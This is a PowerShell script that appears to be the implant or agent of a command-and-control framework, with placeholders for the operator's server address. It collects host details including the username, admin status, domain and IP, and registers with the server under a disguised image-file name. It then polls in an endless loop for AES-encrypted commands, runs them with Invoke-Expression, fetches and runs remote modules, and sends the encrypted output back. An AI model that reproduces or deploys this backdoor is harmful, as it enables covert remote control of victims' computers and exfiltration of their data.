$beacon=1
function CAM ($key,$IV){
try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$a.BlockSize = 128
$a.KeySize = 256
if ($IV)
{
if ($IV.getType().Name -eq "String")
{$a.IV = [System.Convert]::FromBase64String($IV)}
else
{$a.IV = $IV}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$a.Key = [System.Convert]::FromBase64String($key)}
else
{$a.Key = $key}
}
$a}


function ENC ($key,$un,$file=0){
if ($file -eq 0){
$b = [System.Text.Encoding]::UTF8.GetBytes($un)}
else{
$b=$un}
$a = CAM $key
$e = $a.CreateEncryptor()
$f = $e.TransformFinalBlock($b, 0, $b.Length)
[byte[]] $p = $a.IV + $f
[System.Convert]::ToBase64String($p)
}


function DEC ($key,$enc,$file=0){
$b = [System.Convert]::FromBase64String($enc)
$IV = $b[0..15]
$a = CAM $key $IV
$d = $a.CreateDecryptor()
$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
if ($file -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}



function load($module)
      {

            $modulename = enc -key $key -un $module
            $postParams = @{data=$modulename}
            $re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
            $modulecontent=dec -key $key -enc $re.Content


      return $modulecontent
      }

$hostname = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $t="*"}
$whoami = $env:USERNAME;
$whoami ="$t$whoami"
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
$IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$agent="$random-img.jpeg"
$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid"
$wc3 = new-object net.WebClient
      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
$progressPreference = 'silentlyContinue';

$wc3 = New-Object system.Net.WebClient;
while($true){
$req = [System.Net.WebRequest]::Create("{HTTP}://{ip}:{port}{cmd}?page=$agent")
$resp = $req.GetResponse()
$reqstream = $resp.GetResponseStream()
$stream = new-object System.IO.StreamReader $reqstream
$enc = $stream.ReadToEnd()


if($enc -eq "REGISTER"){
$wc3 = new-object net.WebClient
      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
$progressPreference = 'silentlyContinue';
continue
}
if($enc -eq "kill"){
exit
}

if($enc -eq "-"){
sleep $beacon
}
else{
$cm=dec -key $key -enc $enc



if($cm.split(" ")[0] -eq "load"){
$f=$cm.split(" ")[1]
$module=load -module $f
try{
$output=Invoke-Expression ($module) -ErrorVariable badoutput | Out-String
        }
        catch{
        $output = $Error[0] | Out-String;
        }
        if ($output.Length -eq 0){
        $output="$output$badoutput"
        }


}
else{
try{
$output=Invoke-Expression ($cm) -ErrorVariable badoutput | Out-String
        }
        catch{
        $output = $Error[0] | Out-String;
        }
        if ($output.Length -eq 0){
        $output="$output$badoutput"
        }}

  if ($output.Length -eq 0){
$output="$output$badoutput"
}

$redata=enc -key $key -un $output


$postParams = @{data=$redata}

$re=Invoke-WebRequest -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re}?page=$agent -Method POST -Body $postParams
$re=" "

}
}
